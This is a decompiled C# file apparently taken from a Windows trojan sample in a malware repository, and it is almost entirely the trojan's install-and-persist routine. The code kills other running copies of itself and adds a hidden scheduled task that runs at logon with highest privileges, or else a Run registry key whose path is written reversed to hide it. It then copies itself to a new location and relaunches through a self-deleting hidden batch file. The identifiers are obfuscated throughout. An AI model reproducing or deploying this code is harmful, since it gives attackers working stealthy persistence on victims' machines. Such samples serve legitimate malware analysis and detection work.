// Decompiled with JetBrains decompiler
// Type: TdTMYMKklVXy.TfgESwwoGAkrX
// Assembly: deinvater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89B491E0-9EDA-4D26-ADB9-208707ED33ED
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-561b48f813af5f638c5f305d21a716998cce9e0ce1ea3374fd118cec5f725885.exe

using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using xjXkkjtlfmw;
using zOUYjcXSyH;

namespace TdTMYMKklVXy
{
  internal class TfgESwwoGAkrX
  {
    public static void AoCcnFhzBVqXiyyKoK()
    {
      try
      {
        FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(FBcKnoLoUsnvl.ayPUDbTHPGBqdUYW), FBcKnoLoUsnvl.cGKBeErXjKgd));
        string fileName = Process.GetCurrentProcess().MainModule.FileName;
        if (!(fileName != fileInfo.FullName))
          return;
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            if (process.MainModule.FileName == fileInfo.FullName)
              process.Kill();
          }
          catch
          {
          }
        }
        if (QBtrXhHIUz.DKwQvgNlyVN())
        {
          Process.Start(new ProcessStartInfo()
          {
            FileName = "cmd",
            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
          });
        }
        else
        {
          using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
            registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), (object) ("\"" + fileInfo.FullName + "\""));
        }
        if (File.Exists(fileInfo.FullName))
        {
          File.Delete(fileInfo.FullName);
          Thread.Sleep(1000);
        }
        FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
        byte[] numArray = File.ReadAllBytes(fileName);
        byte[] buffer = numArray;
        int length = numArray.Length;
        fileStream.Write(buffer, 0, length);
        QBtrXhHIUz.HGpQvpdmGZk();
        string path = Path.GetTempFileName() + ".bat";
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          streamWriter.WriteLine("@echo off");
          streamWriter.WriteLine("timeout 3 > NUL");
          streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
          streamWriter.WriteLine("CD " + Path.GetTempPath());
          streamWriter.WriteLine("DEL \"" + Path.GetFileName(path) + "\" /f /q");
        }
        Process.Start(new ProcessStartInfo()
        {
          FileName = path,
          CreateNoWindow = true,
          ErrorDialog = false,
          UseShellExecute = false,
          WindowStyle = ProcessWindowStyle.Hidden
        });
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
      }
    }
  }
}
